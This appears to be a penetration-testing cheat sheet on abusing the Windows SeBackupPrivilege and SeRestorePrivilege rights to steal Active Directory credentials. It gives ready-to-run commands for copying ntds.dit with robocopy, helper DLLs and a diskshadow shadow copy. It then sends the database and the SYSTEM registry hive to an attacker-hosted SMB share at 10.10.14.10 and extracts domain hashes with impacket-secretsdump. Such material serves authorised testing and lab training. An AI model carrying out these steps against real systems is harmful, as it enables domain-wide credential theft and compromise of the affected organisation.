---
title: "SeBackupPrivilege/SeRestorePrivilege"
date: 2024-7-18
tags: ["SeBackupPrivilege", "SeRestorePrivilege", "privesc", "Windows", "Backup Operators", "diskshadow", "secretsdump"]
---

---
### Abuse #1: Robocopy

```powershell
# For example
robocopy /b <TARGET_DIR_PATH> C:\Windows\Tasks <TARGET_FILE>
```

<br>

---

### Abuse #2: Using helper dlls

[SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true)

[SeBackupPrivilegeCmdLets.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true)

```powershell
import-module .\SeBackupPrivilegeCmdLets.dll
```

```powershell
import-module .\SeBackupPrivilegeUtils.dll
```

```powershell
Copy-FileSeBackupPrivilege <TARGET_FILE_PATH> C:\ProgramData\<TARGET_FILE>
```

```powershell
# For example
Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit
```

<br>

---

### Abuse #3: Diskshadow

#### 1. Create a .dsh file

```bash
set context persistent nowriters
set metadata C:\ProgramData\test.cab
set verbose on
add volume c: alias test
create
expose %test% x:
```

<br>

```bash
# Convert to dos format
unix2dos vss.dsh
```

#### 2. Run vss.dsh

```powershell
# Upload and run
diskshadow /s C:\ProgramData\vss.dsh
```

#### 3. Host a smb server (In Linux)

```bash
impacket-smbserver share . -smb2support
```

#### 4. Copy to local Linux

```bash
net use \\10.10.14.10\share
```

```bash
Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\10.10.14.10\share\ntds.dit
```

```bash
reg.exe save hklm\system \\10.10.14.10\share\system
```

#### 5. Secrets dump

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

<br>